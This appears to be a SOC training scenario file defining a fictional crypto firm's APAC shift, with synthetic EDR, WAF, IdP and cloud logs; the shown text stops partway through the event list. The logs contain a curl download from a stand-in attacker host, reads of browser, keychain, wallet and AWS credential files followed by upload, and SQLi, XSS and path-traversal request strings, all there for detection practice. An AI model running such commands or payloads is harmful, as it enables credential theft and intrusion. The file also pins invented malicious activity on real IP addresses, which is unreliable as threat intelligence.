/* Scenario: Kestrel Ledger, APAC shift, 2026-11-05.
   Kestrel Ledger is a fictional company and every event below is synthetic.
   Real-world anchors used on purpose so live enrichment returns something true:
   - npm package "ethersscan-api" is OSV MAL-2024-8847 (BeaverTail, DPRK-linked).
   - 149.28.17.9 and 45.32.101.18 sit in a VPS provider's address space; RDAP shows the real owner. The activity is invented.
   - MetaMask's Chrome extension id nkbihfbeogaeaoehlefnkodbefgpgknn is the real store id.
   Documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) stand in for attacker infrastructure.
   Format: docs/SCENARIOS.md. Check with: node tools/validate-scenario.mjs app/scenarios/kestrel-ledger */
(function (root) {
  "use strict";

  var scenario = {
    schema: 1,
    id: "kestrel-ledger",
    title: "Kestrel Ledger SOC",
    subtitle: "Sample estate (fictional): 5 staff, 5 hosts, a customer portal, 5 log sources",
    summary: "A nine-hour APAC shift at a fictional crypto custody firm: a fake recruiter take-home test, credential stuffing, an infostealer with session replay, a confidential file to personal storage, and two noisy rules.",
    level: "intermediate",

    estate: {
      company: "Kestrel Ledger (fictional)",
      shift: { name: "APAC", startUtc: "00:00", endUtc: "09:00", local: "08:00 to 17:00 MYT", from: "AMER", to: "EMEA", date: "2026-11-05" },
      corpEgress: ["100.64.10.0/24", "100.64.20.0/24"],
      scanner: { ip: "10.20.0.15", name: "vuln-scan-01", window: "Thursdays 02:00 to 04:00 UTC", ticket: "CHG-2291" },
      users: {
        "a.rahman": { name: "A. Rahman", dept: "Wallet engineering", host: "KL-MBP-0142", os: "macOS 15", region: "Kuala Lumpur", usualAsn: "AS4788 TM Net", aws: "a.rahman (IAM user, key AKIA...7QXD)" },
        "l.chen": { name: "L. Chen", dept: "SRE", host: "SG-WIN-0311", os: "Windows 11", region: "Singapore", usualAsn: "AS9506 Singtel", privileged: true },
        "j.okafor": { name: "J. Okafor", dept: "Treasury finance", host: "LIS-WIN-0087", os: "Windows 11", region: "Lisbon", usualAsn: "AS3243 MEO" },
        "m.silva": { name: "M. Silva", dept: "IT operations", host: "LIS-WIN-0021", os: "Windows 11", region: "Lisbon", usualAsn: "AS3243 MEO", privileged: true },
        "p.nguyen": { name: "P. Nguyen", dept: "Customer support", host: "HCM-WIN-0450", os: "Windows 11", region: "Ho Chi Minh City", usualAsn: "AS7552 Viettel" }
      },
      hosts: {
        "KL-MBP-0142": { owner: "a.rahman", os: "macOS 15.1", role: "Developer laptop", edr: "online" },
        "SG-WIN-0311": { owner: "l.chen", os: "Windows 11 23H2", role: "SRE workstation", edr: "online" },
        "LIS-WIN-0087": { owner: "j.okafor", os: "Windows 11 23H2", role: "Finance workstation", edr: "online" },
        "LIS-WIN-0021": { owner: "m.silva", os: "Windows 11 23H2", role: "IT admin workstation", edr: "online" },
        "HCM-WIN-0450": { owner: "p.nguyen", os: "Windows 11 23H2", role: "Support workstation", edr: "online" }
      },
      apps: { "app.kestrel.example": "Customer portal (WAF: managed rules + rate limit)", "staging.kestrel.example": "Staging portal", "kestrel.okta.example": "Workforce IdP" }
    },

    /* teams an incident or a pending action can be handed to */
    owners: ["APAC SOC", "EMEA SOC (next shift)", "AMER SOC", "IR lead", "IT operations", "Cloud platform", "Fraud / Customer support", "Data protection"],

    /* entities too common to link alerts on */
    noisyEntities: ["app.kestrel.example", "staging.kestrel.example"],

    /* public facts the live lookups return real data for; the validator allows these outside the synthetic ranges */
    anchors: {
      ips: ["149.28.17.9", "45.32.101.18", "140.82.112.4", "13.107.42.14", "104.192.141.1"],
      packages: ["npm:ethersscan-api"],
      notes: "The npm package ethersscan-api (OSV MAL-2024-8847) and the owners of the two VPS addresses 149.28.17.9 and 45.32.101.18 are real, so those lookups return true answers. The GitHub, LinkedIn and Bitbucket addresses are the services' public addresses. The MetaMask extension id is the real Chrome Web Store id. Every other person, host, customer and event is invented."
    },

    /* minutes from an alert's first event to its arrival in the queue, per platform: streaming EDR and WAF in about a minute,
       SSE log upload in two, scheduled SIEM searches on a five-minute cadence. Correlations arrive at the event that completes them. */
    alertDelayMinutes: { EDR: 1, WAF: 1, SSE: 2, SIEM: 5 },

    /* observable defaults for the case exports: values that are never IOCs (well-known services, the company's own domains and documents) */
    observables: {
      notIoc: ["kestrel.example", "zendesk.example", "github.com", "bitbucket.org", "linkedin.com", "google.com", "azure.com", "140.82.112.4", "13.107.42.14", "104.192.141.1", "Q3_reserve_attestation_draft.xlsx"],
      external: { tlp: "GREEN", pap: "AMBER" },
      internal: { tlp: "AMBER+STRICT", pap: "RED" }
    },

    /* ?seed=N re-draws these: attacker addresses inside the documentation ranges, workstation numbers and the customer id */
    variants: {
      ipPools: ["192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24"],
      idPools: [{ prefixes: ["KL-MBP-", "SG-WIN-", "LIS-WIN-", "HCM-WIN-"], digits: 4 }, { prefixes: ["cust-"], digits: 5 }]
    },

    enrichExamples: ["ethersscan-api", "149.28.17.9", "45.32.101.18", "203.0.113.47", "CVE-2024-3400", "dl-mirror.example"],

    /* the carried-in handover from the previous shift */
    handoverIn: {
      from: "AMER", analyst: "AMER analyst on duty", at: "2026-11-04T23:58:00Z",
      summary: "Quiet shift apart from an MFA push-fatigue attempt on a finance user. One case open, one pending action with IT.",
      items: [
        { case: "CASE-1187", kind: "case", title: "MFA push fatigue against j.okafor", severity: "medium", status: "open",
          done: "14 Okta Verify pushes from 192.0.2.66 between 23:12 and 23:40 UTC, all denied. No successful sign-in. User reached by Slack at 23:45, confirmed it was not them.",
          next: "Confirm IT ticket IT-5521 (password reset + MFA re-enrolment) is complete. Watch 192.0.2.66 and any further pushes to j.okafor.",
          owner: "APAC", due: "02:00 UTC", pending: "IT-5521 password reset (IT operations)",
          ticket: "IT-5521",
          pendingAction: { entity: "user:j.okafor", action: "reset", label: "Force password + MFA reset (IT-5521)", platform: "IdP", owner: "IT operations" } },
        { case: "WATCH", kind: "watch", title: "Weekly authenticated vulnerability scan", severity: "info", status: "watch",
          done: "CHG-2291 approved: vuln-scan-01 (10.20.0.15) scans staging.kestrel.example Thursdays 02:00 to 04:00 UTC.",
          next: "Expect WAF SQLi/XSS hits from 10.20.0.15 in that window. Anything outside it is not covered by the change.", owner: "APAC", due: "04:00 UTC" }
      ],
      watch: ["192.0.2.66: MFA push source in CASE-1187 (AMER)", "10.20.0.15: approved scanner, CHG-2291, Thursdays 02:00 to 04:00 UTC only"],
      metrics: { alerts: 11, tp: 1, fp: 7, benign: 3, escalated: 0 }
    },

    /* event lake: one record per line, sorted by _t. _src picks the log shape, _t is the UTC time. */
    events: [
    {"_src":"idp","_t":"2026-11-04T23:12:00Z","client":{"geographicalContext":{"country":"NL"},"ipAddress":"192.0.2.66"},"published":"2026-11-04T23:12:00Z","eventType":"system.push.send_factor_verify_push","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-04T23:15:00Z","client":{"geographicalContext":{"country":"NL"},"ipAddress":"192.0.2.66"},"published":"2026-11-04T23:15:00Z","eventType":"system.push.send_factor_verify_push","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-04T23:18:00Z","client":{"geographicalContext":{"country":"NL"},"ipAddress":"192.0.2.66"},"published":"2026-11-04T23:18:00Z","eventType":"system.push.send_factor_verify_push","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-04T23:40:10Z","published":"2026-11-04T23:40:10Z","eventType":"user.authentication.auth_via_mfa","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"client":{"ipAddress":"192.0.2.66"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"FAILURE","reason":"Okta Verify push rejected by user"}},
    {"_src":"idp","_t":"2026-11-05T00:04:11Z","target":[{"displayName":"GitHub Enterprise"}],"authenticationContext":{"externalSessionId":"idx-ar-0451"},"published":"2026-11-05T00:04:11Z","eventType":"user.authentication.sso","actor":{"alternateId":"a.rahman@kestrel.example","type":"User"},"client":{"ipAddress":"100.64.10.21"},"securityContext":{"asOrg":"AS4788 TM Net","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-05T00:06:40Z","target":[{"displayName":"AWS IAM Identity Center"}],"authenticationContext":{"externalSessionId":"idx-lc-7720"},"published":"2026-11-05T00:06:40Z","eventType":"user.authentication.sso","actor":{"alternateId":"l.chen@kestrel.example","type":"User"},"client":{"ipAddress":"100.64.20.8"},"securityContext":{"asOrg":"AS9506 Singtel","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-05T00:09:02Z","target":[{"displayName":"Zendesk"}],"authenticationContext":{"externalSessionId":"idx-pn-1102"},"published":"2026-11-05T00:09:02Z","eventType":"user.authentication.sso","actor":{"alternateId":"p.nguyen@kestrel.example","type":"User"},"client":{"ipAddress":"100.64.10.40"},"securityContext":{"asOrg":"AS7552 Viettel","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"sse","_t":"2026-11-05T00:10:31Z","url":"github.com/kestrel-ledger/wallet-core/pull/2214","urlcategory":"Professional Services","action":"Allowed","appname":"GitHub","bytes_out":4210,"dst_ip":"140.82.112.4","dst_port":443,"datetime":"2026-11-05T00:10:31","user":"a.rahman@kestrel.example"},
    {"_src":"sse","_t":"2026-11-05T00:12:55Z","url":"kestrel.zendesk.example/agent/tickets/88121","urlcategory":"Business","action":"Allowed","appname":"Zendesk","bytes_out":1880,"dst_ip":"100.64.99.10","dst_port":443,"datetime":"2026-11-05T00:12:55","user":"p.nguyen@kestrel.example"},
    {"_src":"edr","_t":"2026-11-05T00:14:20Z","FileName":"Teams.exe","FolderPath":"C:\\Program Files\\WindowsApps\\MSTeams\\Teams.exe","ProcessCommandLine":"Teams.exe --system-initiated","InitiatingProcessFileName":"explorer.exe","SHA256":"d3b1...synthetic","Timestamp":"2026-11-05T00:14:20","DeviceName":"LIS-WIN-0021","AccountName":"m.silva","ActionType":"ProcessCreated"},
    {"_src":"sse","_t":"2026-11-05T00:18:02Z","url":"files.dl-mirror.example/CapCut_Pro_Setup.zip","urlcategory":"File Sharing","action":"Allowed","appname":"General Browsing","bytes_out":610,"filename":"CapCut_Pro_Setup.zip","dst_ip":"203.0.113.80","dst_port":443,"datetime":"2026-11-05T00:18:02","user":"l.chen@kestrel.example"},
    {"_src":"edr","_t":"2026-11-05T00:20:11Z","FileName":"CapCut_Pro_Setup.exe","FolderPath":"C:\\Users\\l.chen\\Downloads\\CapCut_Pro_Setup\\CapCut_Pro_Setup.exe","ProcessCommandLine":"\"CapCut_Pro_Setup.exe\"","InitiatingProcessFileName":"explorer.exe","Signer":"unsigned","SHA256":"9f2c...synthetic","Timestamp":"2026-11-05T00:20:11","DeviceName":"SG-WIN-0311","AccountName":"l.chen","ActionType":"ProcessCreated"},
    {"_src":"edr","_t":"2026-11-05T00:20:19Z","FileName":"CapCut_Pro_Setup.exe","TargetFilePath":"C:\\Users\\l.chen\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies","InitiatingProcessFileName":"CapCut_Pro_Setup.exe","Timestamp":"2026-11-05T00:20:19","DeviceName":"SG-WIN-0311","AccountName":"l.chen","ActionType":"FileRead"},
    {"_src":"edr","_t":"2026-11-05T00:20:20Z","FileName":"CapCut_Pro_Setup.exe","TargetFilePath":"C:\\Users\\l.chen\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data","InitiatingProcessFileName":"CapCut_Pro_Setup.exe","Timestamp":"2026-11-05T00:20:20","DeviceName":"SG-WIN-0311","AccountName":"l.chen","ActionType":"FileRead"},
    {"_src":"edr","_t":"2026-11-05T00:20:26Z","FileName":"CapCut_Pro_Setup.exe","InitiatingProcessFileName":"CapCut_Pro_Setup.exe","RemoteIP":"203.0.113.80","RemotePort":443,"RemoteUrl":"files.dl-mirror.example","BytesSent":1843200,"Timestamp":"2026-11-05T00:20:26","DeviceName":"SG-WIN-0311","AccountName":"l.chen","ActionType":"ConnectionSuccess"},
    {"_src":"cloud","_t":"2026-11-05T00:31:12Z","eventTime":"2026-11-05T00:31:12","eventSource":"sts.amazonaws.com","eventName":"GetCallerIdentity","userIdentity":{"type":"IAMUser","userName":"a.rahman","accessKeyId":"AKIAEXAMPLE7QXD","arn":"arn:aws:iam::111122223333:user/a.rahman"},"sourceIPAddress":"100.64.10.21","userAgent":"aws-cli/2.17.0 md/awscrt#0.20.11 ua/2.0 os/macos#24.1.0 md/arch#arm64 lang/python#3.11.9","awsRegion":"ap-southeast-1","recipientAccountId":"111122223333"},
    {"_src":"sse","_t":"2026-11-05T00:58:40Z","url":"www.linkedin.com/messaging/thread/2-synthetic","urlcategory":"Social Networking","action":"Allowed","appname":"LinkedIn","bytes_out":2210,"dst_ip":"13.107.42.14","dst_port":443,"datetime":"2026-11-05T00:58:40","user":"a.rahman@kestrel.example"},
    {"_src":"sse","_t":"2026-11-05T01:02:13Z","url":"bitbucket.org/defi-talent-hub/dex-dashboard-assessment/get/main.zip","urlcategory":"Professional Services","action":"Allowed","appname":"Bitbucket","bytes_out":900,"filename":"dex-dashboard-assessment-main.zip","dst_ip":"104.192.141.1","dst_port":443,"datetime":"2026-11-05T01:02:13","user":"a.rahman@kestrel.example"},
    {"_src":"edr","_t":"2026-11-05T01:04:55Z","FileName":"npm","FolderPath":"/opt/homebrew/bin/npm","ProcessCommandLine":"npm install","InitiatingProcessFileName":"zsh","WorkingDirectory":"/Users/a.rahman/Downloads/dex-dashboard-assessment-main","Timestamp":"2026-11-05T01:04:55","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"ProcessCreated"},
    {"_src":"edr","_t":"2026-11-05T01:05:02Z","FileName":"index.js","FolderPath":"/Users/a.rahman/Downloads/dex-dashboard-assessment-main/node_modules/ethersscan-api/index.js","InitiatingProcessFileName":"node","PackageName":"ethersscan-api","PackageVersion":"0.0.1","PackageEcosystem":"npm","Timestamp":"2026-11-05T01:05:02","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"FileCreated"},
    {"_src":"edr","_t":"2026-11-05T01:05:09Z","FileName":"curl","FolderPath":"/usr/bin/curl","ProcessCommandLine":"curl -Lso /Users/a.rahman/.pyp/p.zi http://203.0.113.47:1224/pdown","InitiatingProcessFileName":"node","InitiatingProcessCommandLine":"node server/index.js","Timestamp":"2026-11-05T01:05:09","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"ProcessCreated"},
    {"_src":"edr","_t":"2026-11-05T01:05:13Z","FileName":"curl","InitiatingProcessFileName":"curl","RemoteIP":"203.0.113.47","RemotePort":1224,"RemoteUrl":"","BytesSent":512,"Timestamp":"2026-11-05T01:05:13","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"ConnectionSuccess"},
    {"_src":"edr","_t":"2026-11-05T01:05:40Z","FileName":"python3","FolderPath":"/Users/a.rahman/.pyp/python3","ProcessCommandLine":"/Users/a.rahman/.pyp/python3 /Users/a.rahman/.n2/pay","InitiatingProcessFileName":"node","Timestamp":"2026-11-05T01:05:40","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"ProcessCreated"},
    {"_src":"edr","_t":"2026-11-05T01:05:58Z","FileName":"node","TargetFilePath":"/Users/a.rahman/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log","InitiatingProcessFileName":"node","Timestamp":"2026-11-05T01:05:58","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"FileRead"},
    {"_src":"edr","_t":"2026-11-05T01:06:01Z","FileName":"node","TargetFilePath":"/Users/a.rahman/Library/Keychains/login.keychain-db","InitiatingProcessFileName":"node","Timestamp":"2026-11-05T01:06:01","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"FileRead"},
    {"_src":"edr","_t":"2026-11-05T01:06:20Z","FileName":"python3","TargetFilePath":"/Users/a.rahman/.aws/credentials","InitiatingProcessFileName":"python3","Timestamp":"2026-11-05T01:06:20","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"FileRead"},
    {"_src":"edr","_t":"2026-11-05T01:06:44Z","FileName":"python3","InitiatingProcessFileName":"python3","RemoteIP":"203.0.113.47","RemotePort":1224,"RemoteUrl":"","BytesSent":2411724,"Timestamp":"2026-11-05T01:06:44","DeviceName":"KL-MBP-0142","AccountName":"a.rahman","ActionType":"ConnectionSuccess"},
    {"_src":"sse","_t":"2026-11-05T01:06:45Z","url":"203.0.113.47:1224/uploads","urlcategory":"Miscellaneous or Unknown","action":"Allowed","appname":"General Browsing","bytes_out":2411724,"dst_ip":"203.0.113.47","dst_port":1224,"note":"non-standard port, raw IP, not SSL-inspected","datetime":"2026-11-05T01:06:45","user":"a.rahman@kestrel.example"},
    {"_src":"idp","_t":"2026-11-05T01:20:05Z","client":{"geographicalContext":{"country":"NL"},"ipAddress":"192.0.2.66"},"published":"2026-11-05T01:20:05Z","eventType":"system.push.send_factor_verify_push","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-05T01:20:41Z","client":{"geographicalContext":{"country":"NL"},"ipAddress":"192.0.2.66"},"published":"2026-11-05T01:20:41Z","eventType":"system.push.send_factor_verify_push","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-05T01:21:30Z","published":"2026-11-05T01:21:30Z","eventType":"user.authentication.auth_via_mfa","actor":{"alternateId":"j.okafor@kestrel.example","type":"User"},"client":{"ipAddress":"192.0.2.66"},"securityContext":{"asOrg":"unknown hosting","isProxy":false},"outcome":{"result":"FAILURE","reason":"Okta Verify push rejected by user"}},
    {"_src":"edr","_t":"2026-11-05T01:40:12Z","FileName":"powershell.exe","FolderPath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessCommandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAD0ARwBlAHQALQBTAGUAcgB2AGkAYwBlACAAQgBJAFQAUwA=","InitiatingProcessFileName":"AgentExecutor.exe","InitiatingProcessFolderPath":"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe","InitiatingProcessSigner":"Microsoft Corporation","Timestamp":"2026-11-05T01:40:12","DeviceName":"LIS-WIN-0021","AccountName":"m.silva","ActionType":"ProcessCreated"},
    {"_src":"edr","_t":"2026-11-05T01:40:13Z","FileName":"powershell.exe","FolderPath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessCommandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAD0ARwBlAHQALQBTAGUAcgB2AGkAYwBlACAAQgBJAFQAUwA=","InitiatingProcessFileName":"AgentExecutor.exe","InitiatingProcessFolderPath":"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe","InitiatingProcessSigner":"Microsoft Corporation","Timestamp":"2026-11-05T01:40:13","DeviceName":"HCM-WIN-0450","AccountName":"SYSTEM","ActionType":"ProcessCreated"},
    {"_src":"waf","_t":"2026-11-05T02:05:10Z","ClientIP":"10.20.0.15","ClientRequestHost":"staging.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/search?q=1%27%20OR%20%271%27=%271","ClientRequestUserAgent":"Mozilla/5.0 (compatible; Nessus SOAP)","ClientASN":"internal","ClientCountry":"internal","SecurityAction":"block","SecurityRuleDescription":"SQLi: tautology or UNION in query","EdgeResponseStatus":403,"RequestCount":1,"Datetime":"2026-11-05T02:05:10Z"},
    {"_src":"waf","_t":"2026-11-05T02:06:11Z","ClientIP":"10.20.0.15","ClientRequestHost":"staging.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/api/v1/assets?id=1%20UNION%20SELECT%20NULL--","ClientRequestUserAgent":"Mozilla/5.0 (compatible; Nessus SOAP)","ClientASN":"internal","ClientCountry":"internal","SecurityAction":"block","SecurityRuleDescription":"SQLi: tautology or UNION in query","EdgeResponseStatus":403,"RequestCount":1,"Datetime":"2026-11-05T02:06:11Z"},
    {"_src":"waf","_t":"2026-11-05T02:07:12Z","ClientIP":"10.20.0.15","ClientRequestHost":"staging.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/login?next=%3Cscript%3Ealert(1)%3C/script%3E","ClientRequestUserAgent":"Mozilla/5.0 (compatible; Nessus SOAP)","ClientASN":"internal","ClientCountry":"internal","SecurityAction":"block","SecurityRuleDescription":"XSS: script tag in query","EdgeResponseStatus":403,"RequestCount":1,"Datetime":"2026-11-05T02:07:12Z"},
    {"_src":"waf","_t":"2026-11-05T02:08:13Z","ClientIP":"10.20.0.15","ClientRequestHost":"staging.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/api/v1/export?file=../../../../etc/passwd","ClientRequestUserAgent":"Mozilla/5.0 (compatible; Nessus SOAP)","ClientASN":"internal","ClientCountry":"internal","SecurityAction":"block","SecurityRuleDescription":"Path traversal attempt","EdgeResponseStatus":403,"RequestCount":1,"Datetime":"2026-11-05T02:08:13Z"},
    {"_src":"waf","_t":"2026-11-05T02:09:14Z","ClientIP":"10.20.0.15","ClientRequestHost":"staging.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/search?q=%27%3B%20WAITFOR%20DELAY%20%270:0:5%27--","ClientRequestUserAgent":"Mozilla/5.0 (compatible; Nessus SOAP)","ClientASN":"internal","ClientCountry":"internal","SecurityAction":"block","SecurityRuleDescription":"SQLi: tautology or UNION in query","EdgeResponseStatus":403,"RequestCount":1,"Datetime":"2026-11-05T02:09:14Z"},
    {"_src":"edr","_t":"2026-11-05T02:30:00Z","FileName":"chrome.exe","FolderPath":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessCommandLine":"chrome.exe","InitiatingProcessFileName":"explorer.exe","Timestamp":"2026-11-05T02:30:00","DeviceName":"HCM-WIN-0450","AccountName":"p.nguyen","ActionType":"ProcessCreated"},
    {"_src":"cloud","_t":"2026-11-05T02:41:07Z","eventTime":"2026-11-05T02:41:07","eventSource":"sts.amazonaws.com","eventName":"GetCallerIdentity","userIdentity":{"type":"IAMUser","userName":"a.rahman","accessKeyId":"AKIAEXAMPLE7QXD","arn":"arn:aws:iam::111122223333:user/a.rahman"},"sourceIPAddress":"149.28.17.9","userAgent":"Boto3/1.34.2 md/Botocore#1.34.2 ua/2.0 os/linux#5.15 lang/python#3.11","awsRegion":"ap-southeast-1","recipientAccountId":"111122223333"},
    {"_src":"cloud","_t":"2026-11-05T02:41:30Z","eventSource":"s3.amazonaws.com","eventTime":"2026-11-05T02:41:30","eventName":"ListBuckets","userIdentity":{"type":"IAMUser","userName":"a.rahman","accessKeyId":"AKIAEXAMPLE7QXD","arn":"arn:aws:iam::111122223333:user/a.rahman"},"sourceIPAddress":"149.28.17.9","userAgent":"Boto3/1.34.2 md/Botocore#1.34.2 ua/2.0 os/linux#5.15 lang/python#3.11","awsRegion":"ap-southeast-1","recipientAccountId":"111122223333"},
    {"_src":"cloud","_t":"2026-11-05T02:42:02Z","eventSource":"s3.amazonaws.com","requestParameters":{"bucketName":"kestrel-treasury-reports","key":"2026/10/reserve-breakdown.xlsx"},"errorCode":"AccessDenied","eventTime":"2026-11-05T02:42:02","eventName":"GetObject","userIdentity":{"type":"IAMUser","userName":"a.rahman","accessKeyId":"AKIAEXAMPLE7QXD","arn":"arn:aws:iam::111122223333:user/a.rahman"},"sourceIPAddress":"149.28.17.9","userAgent":"Boto3/1.34.2 md/Botocore#1.34.2 ua/2.0 os/linux#5.15 lang/python#3.11","awsRegion":"ap-southeast-1","recipientAccountId":"111122223333"},
    {"_src":"cloud","_t":"2026-11-05T02:43:15Z","eventSource":"iam.amazonaws.com","errorCode":"AccessDenied","eventTime":"2026-11-05T02:43:15","eventName":"ListUsers","userIdentity":{"type":"IAMUser","userName":"a.rahman","accessKeyId":"AKIAEXAMPLE7QXD","arn":"arn:aws:iam::111122223333:user/a.rahman"},"sourceIPAddress":"149.28.17.9","userAgent":"Boto3/1.34.2 md/Botocore#1.34.2 ua/2.0 os/linux#5.15 lang/python#3.11","awsRegion":"ap-southeast-1","recipientAccountId":"111122223333"},
    {"_src":"waf","_t":"2026-11-05T03:00:00Z","ClientIP":"198.51.100.10","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"BR","SecurityAction":"managed_challenge","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":403,"RequestCount":140,"DistinctUsernames":120,"Datetime":"2026-11-05T03:00:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:01:00Z","ClientIP":"198.51.100.17","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"VN","SecurityAction":"managed_challenge","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":403,"RequestCount":163,"DistinctUsernames":139,"Datetime":"2026-11-05T03:01:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:02:00Z","ClientIP":"198.51.100.24","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"ID","SecurityAction":"managed_challenge","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":403,"RequestCount":186,"DistinctUsernames":158,"Datetime":"2026-11-05T03:02:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:03:00Z","ClientIP":"198.51.100.31","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"US","SecurityAction":"managed_challenge","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":403,"RequestCount":209,"DistinctUsernames":177,"Datetime":"2026-11-05T03:03:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:04:00Z","ClientIP":"198.51.100.38","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"IN","SecurityAction":"managed_challenge","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":403,"RequestCount":232,"DistinctUsernames":196,"Datetime":"2026-11-05T03:04:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:05:00Z","ClientIP":"198.51.100.45","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"TR","SecurityAction":"managed_challenge","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":403,"RequestCount":255,"DistinctUsernames":215,"Datetime":"2026-11-05T03:05:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:06:00Z","ClientIP":"198.51.100.52","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"PH","SecurityAction":"log","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":401,"RequestCount":278,"DistinctUsernames":234,"Datetime":"2026-11-05T03:06:00Z"},
    {"_src":"waf","_t":"2026-11-05T03:07:00Z","ClientIP":"198.51.100.59","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"MX","SecurityAction":"log","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":401,"RequestCount":301,"DistinctUsernames":253,"Datetime":"2026-11-05T03:07:00Z"},
